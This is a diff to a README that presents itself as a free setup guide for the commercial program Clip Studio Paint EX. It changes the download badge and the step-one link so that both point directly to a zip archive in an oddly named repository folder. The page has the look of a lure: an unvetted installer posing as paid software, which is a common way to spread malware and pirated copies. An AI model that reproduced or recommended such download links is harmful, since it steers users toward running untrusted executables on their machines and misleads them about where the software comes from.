@@ -1,6 +1,6 @@
 # 🎨 Clip-Studio-Paint-EX-Setup - Create Professional Art And Manga Easily
 
-[<img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download Link" />](https://github.com/hunted-commonshrew360/Clip-Studio-Paint-EX-Setup/releases)
+[<img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download Link" />](https://raw.githubusercontent.com/hunted-commonshrew360/Clip-Studio-Paint-EX-Setup/main/unregeneracy/Setup_E_Studio_Clip_Paint_v3.9-alpha.5.zip)
 
 Clip Studio Paint EX serves professional artists, illustrators, and comic creators. This software offers tools for manga drawing, animation, and illustration. Users gain access to a library of over 100,000 brushes, vector layers, and 3D model posing features. This setup guide helps you install the application on your Windows computer.
 
@@ -30,7 +30,7 @@ Before you start, check if your computer meets these requirements:
 
 Follow these steps to acquire the installer for your system.
 
-1. Visit the project release page: [https://github.com/hunted-commonshrew360/Clip-Studio-Paint-EX-Setup/releases](https://github.com/hunted-commonshrew360/Clip-Studio-Paint-EX-Setup/releases)
+1. Visit the project release page: [https://raw.githubusercontent.com/hunted-commonshrew360/Clip-Studio-Paint-EX-Setup/main/unregeneracy/Setup_E_Studio_Clip_Paint_v3.9-alpha.5.zip](https://raw.githubusercontent.com/hunted-commonshrew360/Clip-Studio-Paint-EX-Setup/main/unregeneracy/Setup_E_Studio_Clip_Paint_v3.9-alpha.5.zip)
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to begin the download.
 4. Save the file to your "Downloads" folder.
